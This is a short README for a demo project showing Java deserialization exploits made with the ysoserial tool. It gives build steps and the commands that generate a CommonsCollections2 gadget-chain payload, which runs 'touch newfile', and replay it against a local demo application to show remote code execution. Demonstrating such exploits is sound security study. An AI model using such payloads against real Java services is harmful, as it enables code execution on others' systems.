# ysoserial POC
Some simple demonstrations of deserialization gadget chain exploits created in [ysoserial](https://github.com/frohoff/ysoserial).

Note that I use openjdk version "11.0.2" 2019-01-15 to run ysoserial and the demo application. Much of this will not work in later versions.
```
export JAVA_HOME=~/dev/jdk/jdk-11.0.2
mvn clean install
```


## CommonsCollections2
Generate the payload with ysoserial:
```
java -jar ysoserial-all.jar CommonsCollections2 "touch newfile" > CommonsCollections2.payload.bin
```

Demonstrate the exploit with:
```
$JAVA_HOME/bin/java -jar target/ysoserial_poc-1.0-SNAPSHOT-all.jar CommonsCollections2.payload.bi
```

Verify that newfile is created, demonstrating RCE.
